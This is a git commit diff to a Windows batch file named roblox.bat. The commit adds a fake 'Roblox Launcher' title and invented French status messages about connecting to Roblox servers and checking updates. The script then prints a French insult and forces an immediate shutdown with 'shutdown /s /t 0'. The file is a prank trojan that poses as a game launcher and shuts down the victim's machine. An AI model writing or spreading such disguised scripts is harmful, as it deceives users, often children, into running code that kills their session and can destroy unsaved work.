aab26d799aeaaded60ec114dd46186e65c8ee860
Miaouxx-Dev <baptiste.hernandez26260@gmail.com>
2026-06-13 19:38:21 +0200

    Update roblox.bat

--- roblox.bat
+++ roblox.bat
@@ -1,5 +1,9 @@
 @echo off
 chcp 65001 > nul 
+title Roblox Launcher
+echo [INFO] Connexion aux serveurs de Roblox en cours...
+echo [INFO] Verification des mises a jours...
+timeout /t 3 /nobreak > nul
 echo Bonne nuit gros con 
 timeout /t 5 /nobreak > nul
 shutdown /s /t 0
